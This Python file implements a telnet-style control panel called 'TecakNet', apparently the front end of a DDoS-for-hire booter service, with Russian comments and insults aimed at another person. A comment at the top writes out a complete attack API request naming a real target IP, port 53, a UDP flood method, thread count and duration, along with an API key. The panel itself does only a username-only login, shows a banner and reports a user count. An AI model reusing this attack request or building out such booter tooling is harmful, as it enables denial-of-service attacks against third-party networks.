#tccc sliv ganva bydet scoro....
import socket
import requests

# Ebanoe govno ot eralpa omarova🎃
#api skid http://109.248.207.134:5000/attack?api=eralpomarov1337&ip=89.185.85.62&port=53&threads=15&method=udp&duration=10
# Фиксированный логин и пароль
VALID_USERNAME = "eralp"
def get_total_users():
    url = "http://127.0.0.1:5000/users?api=eralpomarov1337"

    try:
        response = requests.get(url)
        response.raise_for_status()  # Проверка на ошибки

        data = response.json()  # Парсим JSON-ответ
        total_users = data.get("message")  # Получаем сообщение

        return total_users  # Возвращаем общее количество пользователей
    except requests.exceptions.RequestException as e:
        print(f"Ошибка при выполнении запроса: {e}")
        return "Не удалось получить данные о пользователях."

def start_server(host='0.0.0.0', port=12345):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Сервер запущен на {host}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Подключение от {client_address}")

        try:
            # Изменение заголовка окна PuTTY
            title = "\033]0;TecakNet\007"
            client_socket.send(title.encode('utf-8'))

            # Запрос логина
            client_socket.send("Логин: ".encode('utf-8'))
            username = client_socket.recv(1024).decode('utf-8').strip()

            # Проверка логина и пароля
            if username == VALID_USERNAME:
                title = f"\033]0;TecakNet -> User: {username}. Time: LifeTime -> {get_total_users()}\007"
                client_socket.send(title.encode('utf-8'))
                client_socket.send("\033[32mАвторизация успешна!\033[0m\r\n".encode('utf-8'))

                # Приветственное сообщение с цветом
                welcome_message = """\u001b[34;1m
 ████████ ███████  ██████  ████  ██   ██ ███    ██ ███████ ████████\r
   ██    ██      ██      ██   ██ ██  ██  ████   ██ ██         ██    \r
   ██    █████   ██      ███████ █████   ██ ██  ██ █████      ██    \r
   ██    ██      ██      ██   ██ ██  ██  ██  ██ ██ ██         ██    \r
   ██    ███████  ██████ ██   ██ ██   ██ ██   ████ ███████    ██    \r
\033[0m\r\n"""
                client_socket.send(welcome_message.encode('utf-8'))

                # Основной цикл обработки команд
                while True:
                    client_socket.send(f"{username}@tecaknet$ ".encode('utf-8'))
                    data = client_socket.recv(1024)

                    # Проверка на наличие данных
                    if not data:
                        break

                    command = data.decode('utf-8').strip()
                    print(f"Получена команда: {command}")



                    # Обработка команды
                    if command.lower() == 'exit':
                        client_socket.send("\033[31mОтключение...\r\n\033[0m".encode('utf-8'))
                        break
                    if command == "":
                        client_socket.send("\r\n".encode('utf-8'))
                    elif command == "users":
                        total_users = get_total_users()
                        title = f"\033]0;TecakNet -> User: {username}. Time: LifeTime -> {total_users}\007"
                        client_socket.send(title.encode('utf-8'))
                        client_socket.send(f"\u001b[34;1m{total_users}\u001b[0m\r\n".encode('utf-8'))
                    elif command.lower() == 'help':
                        client_socket.send("Доступные команды: help, exit, users\r\n".encode('utf-8'))
                    else:
                        client_socket.send("Неизвестная команда.\r\n".encode('utf-8'))

            else:
                client_socket.send("\033[31mНеверный логин или пароль. Соединение закрыто.\033[0m\r\n".encode('utf-8'))

        except Exception as e:
            print(f"Ошибка: {e}")
        finally:
            client_socket.close()
            print(f"Отключение {client_address}")


def get_total_users():
    url = "http://127.0.0.1:5000/users?api=eralpomarov1337"

    try:
        response = requests.get(url)
        response.raise_for_status()  # Проверка на ошибки

        data = response.json()  # Парсим JSON-ответ
        total_users = data.get("message")  # Получаем сообщение

        return total_users  # Возвращаем общее количество пользователей
    except requests.exceptions.RequestException as e:
        print(f"Ошибка при выполнении запроса: {e}")
        return "Не удалось получить данные о пользователях."


if __name__ == "__main__":
    start_server()
